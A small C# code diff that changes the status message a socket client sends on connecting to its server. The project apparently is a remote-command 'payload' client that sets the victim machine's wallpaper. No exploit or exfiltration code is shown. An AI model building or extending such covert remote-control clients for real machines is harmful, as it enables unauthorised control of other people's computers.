@@ -8,6 +8,7 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using static Payload.Common.Config;
 
 namespace Payload.Command.SocketClient
 {
@@ -71,7 +72,7 @@ namespace Payload.Command.SocketClient
             try
             {
                 ReTry = false;
-                client.EmitAsync("message", "JACK is Online").Wait();
+                client.EmitAsync("message", Config.Instance.AppMode.Equals(EnumAppMode.JACK)?"JACK is Online":"TESTING...").Wait();
                 Console.WriteLine(DateTime.Now.ToLongTimeString() + " :: CONNECTED SERVER");
                 CommandManager.Instance.AddWallpaperCmd(WallPaper.Mode.RESET);
             }
